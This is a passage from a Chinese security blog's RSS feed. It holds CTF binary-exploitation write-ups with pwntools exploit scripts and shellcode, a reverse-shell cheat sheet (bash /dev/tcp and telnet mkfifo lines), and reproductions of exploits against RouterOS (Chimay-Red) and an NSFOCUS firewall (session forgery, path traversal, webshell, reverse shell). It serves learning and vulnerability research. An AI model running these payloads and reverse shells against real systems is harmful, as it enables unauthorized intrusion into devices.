      <link>https://jellyfish-pro.github.io/ctf/ret2text/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2text/</guid>
      <description>拿到binary后首先查看基本信息：
发现是64位文件，然后使用checksec指令来查看程序的保护情况
发现这道题并没有栈保护和PIE，因为没有PIE，所以.text上的代码地址是固定的，在我们调用函数和构造gadget时就可以直接使用.text上的地址。
然后我们将binary放入IDA中：
我们可以清楚看到main函数，随后我们来到main函数可以看到其中有两个功能函数：
（两个功能函数已被我在IDA中重命名，目的是为了直观展示两个函数的作用）
随后我们跟如两个函数内部：
可以看到两个函数的功能，尤其是int hello ()函数中存在gets()函数，可以成为突破点。
可以看到v1字符串的大小为0x70字节，但是gets函数会读取用户输入直到遇到&amp;rsquo;\n&amp;rsquo;字符，能读取的字符串长度大于0x70字节，这将导致缓冲区溢出，由于变量v1储存在栈上，所以将导致栈溢出。
于是我们利用Linux自带的cyclic命令构建200个有序字符，因为是有序的字符串，所以我们可以通过任意四个字符来定位这四个字符在这字符串中的位置，从而计算出这四个字符前面有多少个字符：
然后在gdb中运行ret2text，使用r指令，gdb会在输入字符处停下来，等待输入。
我们输入刚刚的200个有序字符，回车后我们可以看到程序到了一个无法识别的地方：
这就证明，我们输入的字符串过多，get函数发生了溢出，多余的字符覆盖了原本的ret的值，导致ret将我们输入的参数当作返回地址了，于是我们使用cyclic自带的-l命令来计算输入了多少个字符：
这样我们就知道了，我们需要输入120个字符才能覆盖到ret。
上面因为我们输入的长度覆盖到了ret，导致ret返回到了奇怪的地方。既然ret可以返回到奇怪的地方，那就意味着ret可以返回到能够受我们控制的地方。
在IDA中我们可以看到这样一个函数：
这个函数调用了system函数并且参数是/bin/sh。
如果我们可以让上面说到的ret返回到这个函数上，那么我们就能运行这个函数。运行了system(/bin/sh)我们就能能进入linux shell。
所以我们构造payload，首先是使得gets溢出到ret的padding（填充），再在padding后面跟上这个函数的地址0x4006c7
那么最后我们的payload就是：
Payload=b”a”*120+p(0x4006C7) #ret2text.pyfrom pwn import *p=remote(&amp;#34;10.0.25.109&amp;#34;,10001) p.recvuntil(&amp;#34;?\n&amp;#34;) p.sendline(b&amp;#34;a&amp;#34;*120+p32(0x4006C7)) p.interactive() </description>
    </item>
    
    <item>
      <title>rinetd端口转发</title>
      <link>https://jellyfish-pro.github.io/note/rinetd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/rinetd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</guid>
      <description>rinetd是一个在linux上的端口转发工具。
安装方式 在github上搜索rinetd就可以找到官方仓库
安装命令在README里也有写：
./bootstrap./configure –prefix=/home/shangdi4sb/rinetd #home目录下makemake install 需要注意的是 configure时填写安装目录，我个人是习惯安装在home目录下
配置文件 配置文件的位置为：&amp;lt;安装目录&amp;gt;/etc/rinetd.conf
我们直接打开文件，按照如下格式写入内容就可以了，不需要理会配置文件原有的内容：
bindadress bindport connectaddress connectport监听的ip 监听ip的端口 转发的ip 转发ip的端口 例如我想把本地8080端口的数据转发到qemu(192.168.113.129)的80端口上
0.0.0.0 8080 192.168.113.129 80 启动rinetd rinetd的二进制文件存默认放在：&amp;lt;安装目录&amp;gt;/etc/rinetd.conf
使用如下命令：
./sbin/rinetd -f -c ./etc/rinetd.conf -f 不使用后台模式，一般使用这个参数是为了看报错
-c 指定配置文件</description>
    </item>
    
    <item>
      <title>RouterOS软路由线程同步漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/routeros%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/routeros%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E6%BC%8F%E6%B4%9E/</guid>
      <description>RouterOS软路由线程同步漏洞 漏洞简介 该漏洞存在于RouterOS 6.38.4及以下版本。漏洞原理为未对 alloca()函数分配内存的大小做限制，导致alloca()函数可分配超过本线程内存块大小的内存，从而非法访问其他线程的内存。
漏洞复现 RouterOS环境搭建 因为该漏洞为软路由漏洞，且有x86架构，故我们可使用VMware直接模拟。
首先我们需要先下载Routeros的镜像，或者直接去官网下载镜像
这里我选择的是 RouterOS 6.38.4
然后使用VMware模拟，这里我们指出几个需要注意的点：
这里可以选择Linux 3.x 内核。
随后创建完成虚拟机后，需要修改虚拟机配置：
这里需要将 硬盘(SCSI)改为IDE
随后启动RouterOS虚拟机，一般说来，第一次开机会选择需要安装的服务这里我们直接输入&#39;a&#39;选择所有，然后输入&#39;i&#39;进行安装，然后根据提示一直按 &#39;y&#39;就可以：
安装好后使用 admin：&#39;&#39;登录RouterOS。
然后输入setup命令，根据提示设置ip地址
最后打开浏览器，访问刚刚设定的IP地址，如能访问，则证明安装完成。
RouterOS越狱 因为RouterOS原生操作系统是基于Linux系统复写的一套新操作系统。原生的RouterOS甚至连busybox都没有，更别说后面的调试了。所以我们需要对其进行越狱处理。
这里我们使用的是 mikrotik-tools工具，该工具可以帮助我们进入RouterOS的Linux系统。
使用方法也很简单：
#git clone https://github.com/0ki/mikrotik-tools.git#cd mikrotik-tools#./exploit-backup/exploit_full.sh 随后按照提示输入对应信息就可以。
**注：**因为该方法使用的ssh远程连接RouterOS，所以一些太过古老的版本会提示ssh找不到对应的加密方式。
出现截图中的语句则表示越狱成功。
接下来我们就可以使用telnet连接RouterOS了。(用户密码为 devel:&#39;&#39;)
RouterOS漏洞复现 这里我们使用Chimay-Red项目中的exp.
**注：**该exp需要python2版本的pwntools模块。(直接改成符合python3的语法就行，只需要修改几个字符类型就行。别去安装python2的pwntools环境，浪费时间。别问我怎么知道的)
首先我们先获取当前RouterOS版本中存在漏洞的二进制文件：
#./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_6384_x86 随后使用nc监听端口：
#nc -lnvp 8080 然后使用exp，执行命令：
#./StackClash_x86.py 192.168.113.129 80 www_binary &amp;#34;mknod /ram/f p; /bin/telnet 192.168.113.128 8080 &amp;lt; /ram/f | /bin/bash &amp;gt;/ram/f 2&amp;gt;&amp;amp;1&amp;#34; 漏洞代码分析 在上面的exp利用中，我们看到了，漏洞点是在 /nova/bin/www 中的 alloca函数，因此我们将刚刚拿到的二进制文件，放入IDA。</description>
    </item>
    
    
    <item>
      <title>shell</title>
      <link>https://jellyfish-pro.github.io/note/shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/shell/</guid>
      <description>一般选择反弹shell 攻击机：
nc -lnvp 8080 目标机：
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.113.128/8080 0&amp;gt;&amp;amp;1或bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.113.128/8080 0&amp;gt;&amp;amp;1&amp;#34; 或者
mknod /ram/f p; /bin/telnet 192.168.113.128 8080 &amp;lt; /ram/f | /bin/bash &amp;gt;/ram/f 2&amp;gt;&amp;amp;1 mknod：创建名为 /ram/f的管道
若在脚本中使用：
rm /tmp/f;mknod /tmp/f p;/bin/telnet 192.168.1.3 8080 &amp;lt; /tmp/f |/bin/bash &amp;gt;/tmp/f 2&amp;gt;/tmp/f </description>
    </item>
    
    <item>
      <title>stackprivot</title>
      <link>https://jellyfish-pro.github.io/ctf/stackprivot/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/stackprivot/</guid>
      <description>注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。 查看基本信息：
这道题打开了栈可读可写可执行，那么下一步就查看是否有jmp_rsp指令：
有jmp rsp指令，那么这道题的思路就是将shellcode写入栈，然后利用jmp rsp运行到栈，再指向shellcode。
然后我们通过IDA查看一下padding大小和一些细节：
通过IDA我们可以了解到fgets函数会读取96个字符，而s只会储存48个字符，意思就是会有96-48=48个字符的溢出。
方法一： 我们可以将shellcode写入padding中，再利用pwntools的asm（）函数构造汇编指令，让程序运行到shellcode上。
栈的结构为：
#stackprivot_x64from pwn import *#p = process(&amp;#39;./stackprivot&amp;#39;)p = remote(&amp;#34;10.0.25.109&amp;#34;, 10002)shellcode = &amp;#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;#34;if args.G:gdb.attach(p)sub_rsp_jmp = asm(&amp;#34;sub rsp, 0x40;jmp rsp&amp;#34;,arch = &amp;#39;amd64&amp;#39; )jmp_rsp = 0x40068bpayload = flat([shellcode.ljust(0x30, &amp;#34;A&amp;#34;), b&amp;#39;b&amp;#39;*8 , p64(jmp_rsp), sub_rsp_jmp])p.recvuntil(&amp;#34;?&amp;#34;)p.sendline(payload)p.interactive() 方法二： 我们知道会有48个字符溢出，而减去ret的8位地址，jmp_rsp的8位地址，接下来会有32个字符供我们操作，所以我们可以用一个32个字节以下的shellcode，放入栈中。
栈的结构为：
#stackprivot_x64from pwn import *#p = process(&amp;#39;./stackprivot&amp;#39;)p = remote(&amp;#34;10.0.25.109&amp;#34;, 10002)shellcode = &amp;#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;#34;if args.</description>
    </item>
    
    <item>
      <title>stacksmashes</title>
      <link>https://jellyfish-pro.github.io/ctf/stacksmashes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/stacksmashes/</guid>
      <description>注：这道题需要在Ubuntu16.04的环境上运行。 首先使用checksec查看程序的基本情况：
可以看到这个，程序开启了canary（栈保护）。
当程序开启了banary后，当程序检测到溢出后会调用stack_chk_fail函数，这个函数就会输出报错信息：
可以看到，报错的信息是：字符串+程序名字+terminated
*** stack smashing detected ***: ./stacksmashes_old terminated 这里我们需要将程序放入IDA查看一下程序存储的字符串：
在字符串中我们可以看到，程序中是没有放入文件名字，那么我们可以猜测，报错信息中的文件名，是在程序的主函数加载之前就被载入栈中的。
通过stack_chk_fail函数的源码，我们就可以看出漏洞：
void __attribute__ ((noreturn)) __stack_chk_fail (void){__fortify_fail (&amp;#34;stack smashing detected&amp;#34;);}void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg){/* The loop is added only to keep gcc happy. */while (1)__libc_message (2, &amp;#34;*** %s ***: %s terminated\n&amp;#34;,msg, __libc_argv[0] ?: &amp;#34;&amp;lt;unknown&amp;gt;&amp;#34;); } 在下面__libc_argv[0]这个指针所指的就是我们程序的名字，那么通过这个指针的偏移量，我们就可以打印出任意我们知道地址的字符串。
而这个漏洞在之后的更新中已经修复，故需要在ubuntu16.04上使用。
新版libc中__stack_chk_fail函数代码：
void__attribute__ ((noreturn))__stack_chk_fail (void){__fortify_fail_abort (false, &amp;#34;stack smashing detected&amp;#34;);}void__attribute__ ((noreturn))__fortify_fail_abort (_Bool need_backtrace, const char *msg){/* The loop is added only to keep gcc happy.</description>
    </item>
    
    <item>
      <title>tcpdump快速使用</title>
      <link>https://jellyfish-pro.github.io/note/tcpdump%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/tcpdump%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</guid>
      <description>在windows上可以使用burpsuite进行抓包。但burpsuite在linux上不便于安装。
在linux上我们可以使用tcpdump命令。
具体安装流程我们略过，如要安装可以直接百度。
通过host参数进行IP地址过滤：
tcpdump -n host 192.168.110.129 -n表示不把ip解析成域名
scr可以筛选来源地址：
tcpdump scr 192.168.110.129 dst可以筛选目的地址：
tcpdump dst 192.168.110.129 port指定端口
tcpdump port 8080 若要指定协议，则直接输入就好了：
tcpdump tcp或者tcpdump icmp </description>
    </item>
    
    <item>
      <title>ubuntu20 无setuptools下安装pip</title>
      <link>https://jellyfish-pro.github.io/note/ubuntu20-%E6%97%A0setuptools%E4%B8%8B%E5%AE%89%E8%A3%85pip/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/ubuntu20-%E6%97%A0setuptools%E4%B8%8B%E5%AE%89%E8%A3%85pip/</guid>
      <description>Ubuntu20及以上版本，虽会自带python2，但python2中不会自带pip和setuptools这两个模块。
同时使用Ubuntu20及以上版已经将python-pip移除apt库。
故，我们不能使用tar.gz安装pip和apt安装pip。
这时我们可以去pipy下载对应python2的pip源码：
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py -O get-pip.pypython get-pip.py </description>
    </item>
    
    <item>
      <title>Use_After_Free</title>
      <link>https://jellyfish-pro.github.io/ctf/use_after_free/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/use_after_free/</guid>
      <description>此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)
首先查看一下保护：
可以发现这居然是一个32位程序，并且没有开启pie
随后运行一下程序：
可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。
随后我们来到ida查看这些功能的细节：
在查看添加函数时，我们发现存在一个名为v0的结构体：
通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。
**注意：**这里的content也是通过malloc函数分配的空间。
随后我们看到删除函数：
可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件
结合刚刚程序的流程，我们可以得出一条利用方式：
首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块
**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。
当我们创建两个note后，我们需要将这两个note给删除。
这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：
但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。
这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。
那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。
最后数据就会变为这样：
可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。
如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。
同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。
#!/usr/bin/python3#Use_After_free_exp.py#lab 10 hacknotefrom pwn import *context.log_level = &amp;#39;debug&amp;#39;p = process(&amp;#39;./hacknote&amp;#39;)magic = 0x08048986p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.send(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Note size :&amp;#39;)p.send(&amp;#39;16&amp;#39;)p.recvuntil(&amp;#39;Content :&amp;#39;)p.send(&amp;#39;aaaa&amp;#39;)p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.send(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Note size :&amp;#39;)p.send(&amp;#39;16&amp;#39;)p.recvuntil(&amp;#39;Content :&amp;#39;)p.send(&amp;#39;bbbb&amp;#39;)p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.</description>
    </item>
    
    <item>
      <title>报错read-only file system解决方法</title>
      <link>https://jellyfish-pro.github.io/note/%E6%8A%A5%E9%94%99read-only-file-system%E7%BB%93%E5%B1%80%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/%E6%8A%A5%E9%94%99read-only-file-system%E7%BB%93%E5%B1%80%E6%96%B9%E6%B3%95/</guid>
      <description>mount -o remount,rw / 使用mount命令重新挂载根目录，给一个可读可写的权限</description>
    </item>
    
    <item>
      <title>绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/lvmeng_ng3_g2000l_firewall_upload_pathtraversal/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/lvmeng_ng3_g2000l_firewall_upload_pathtraversal/</guid>
      <description>绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞 漏洞介绍 测试环境时在绿盟NG3 G2000L防火墙上进行的，固件版本：V6.0.1.58；引擎版本：V6.0.3.134。
根据网络上就传的poc信息，该漏洞组合可能广泛存在于绿盟的整个NG系列防火墙上。不过因为防火墙和固件版本不一样，导致最终的发包内容有所区别。
文件上传漏洞：该漏洞是因为开发时并没有考虑到特殊情况，从而产生漏洞 路径穿越漏洞：该漏洞是因为文件上传漏洞造成的次生漏洞，因为攻击者上传了特殊文件，从而导致攻击者可以控制本不能控制的参数，从而造成路径穿越。 环境复现 对绿盟防火墙环境的复现可以既简单又困难 矛盾文学（雾）
困难的地方在于，在网络上找不到绿盟防火墙的完整固件。在其官网中也只能找到升级包，而并非完整的固件包。
但如果能够直接购买到设备，那就会变得特别的简单。
无法获得底层shell 当然拿到设备后，可以发现该设备有很多账户，但是只有develop账户可以进入最底层的Linux。可这个账户的密码，是根据一套算法实时计算的，只有寻找绿盟客服才能获得密码。
所以我们只能采取其他方法。
漏洞分析 文件上传漏洞 这里我们首先使用bp模拟发包：
这里首先上传了一个名sess_82c13f359d0dd8f51c29d658a9c8ac71的文件，其实通过这个文件名称，我们就可以大概猜到其作用：想要保存一个session对话。
一般sess打头的文件都是放在*/tmp*目录下，但以防万一，我们还是在代码中找了一下：
./nsfocus/web/rest4espc/ipsv1/dispatch/v1/device/bugsInfo/resourse.php 通过代码，可以发现上传路径就是*/tmp*。
同时，在这个文件中还可以看到一个身份判断：
这里将$token和$contents进行比较，$contents来自*/tmp/token*文件，而$token来自我们GET传输的数据。
那么我们如何绕过这个验证呢？答案是什么都不做。
因为如果我们访问的sess文件中没有$contents的值，则php就会将$contents置为空。同时如果我们发包时，不使用GET传递参数，那么php会将$token也置为空。两个值都置空了，那两个值不就相等了？PHP 是最好的语言
路径穿越漏洞 通过bp的包，我们可以看到，这时的session_id是最开始我们上传的文件名
那么这个包，是怎么导致路径穿越的呢？根据上面这个包访问的路径：
./nsfocus/web/apache2/sslvpn/mail/include/header_main.php 可以看到这里包含了一个叫做compose.php的文件，文件本来的意思是读取session中&amp;quot;lang&amp;quot;的值，并将这个值拼接成一个路径。
但是我们在伪造的sess文件中存入了特殊的&amp;quot;lang&amp;quot;的值：
lang|s:52:&amp;#34;../../../../../../../../../../../../../../../../tmp/&amp;#34; 为了直观显示被修改后的效果，这里我修改了原文件，使其输出$lang：
通过这样的方法，我们就控制了$lang的值，从而让PHP文件包含了我们指定文件夹下的compose.php文件
漏洞利用 通过上面的漏洞分析，我们可以将利用链总结如下：
上传一个伪造session，使第二个漏洞包含*/tmp下的compose.php*文件。 然后再上传一个含有一句话马的名字为compose.php的文件到*/tmp*下 最后访问header_main.php，触发路径穿越，导致包含到*/tmp下刚刚上传的compose.php*文件。 最后exp 上传第一个包：
上传第二个包：
最后触发路径穿越：
./test2.py 192.168.1.1 &amp;#34;rm /tmp/f; mknod /tmp/f p; /bin/telnet 192.168.1.3 8080 &amp;lt; /tmp/f | /bin/bash &amp;gt;/tmp/f 2&amp;gt;/tmp/f&amp;#34; </description>
    </item>
    
    <item>
      <title>设备无scp命令时将文件传出的方法</title>
      <link>https://jellyfish-pro.github.io/note/%E8%AE%BE%E5%A4%87%E6%97%A0scp%E5%91%BD%E4%BB%A4%E6%97%B6%E5%B0%86%E6%96%87%E4%BB%B6%E4%BC%A0%E5%87%BA%E7%9A%84%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/%E8%AE%BE%E5%A4%87%E6%97%A0scp%E5%91%BD%E4%BB%A4%E6%97%B6%E5%B0%86%E6%96%87%E4%BB%B6%E4%BC%A0%E5%87%BA%E7%9A%84%E6%96%B9%E6%B3%95/</guid>
      <description>首先检查是否有wget或curl
然后检查设备的busybox中是否有nc命令
本地开启http服务，准备好对应架构的busybox，利用wget或curl获取busybox
随后在本地打开nc准备接受：
nc -l port &amp;gt; your_file 在设备上使用命令：
./busybox nc ip port &amp;lt; your_file </description>
    </item>
    
  </channel>
</rss>
